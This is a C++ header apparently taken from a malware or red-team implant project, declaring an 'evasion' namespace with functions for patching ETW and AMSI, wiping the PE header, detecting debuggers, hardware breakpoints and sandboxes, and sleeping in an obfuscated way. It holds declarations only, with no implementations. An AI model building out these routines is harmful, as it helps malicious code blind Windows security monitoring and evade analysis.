#pragma once
#include <windows.h>
namespace evasion {
    void patch_etw();
    void patch_amsi();
    void wipe_pe_header();
    bool is_debugged();
    bool is_sandbox_resolution();
    bool has_hw_breakpoints();
    bool is_kernel_debugger();
    bool is_debugger_parent();
    void obfuscated_sleep(DWORD ms);
}
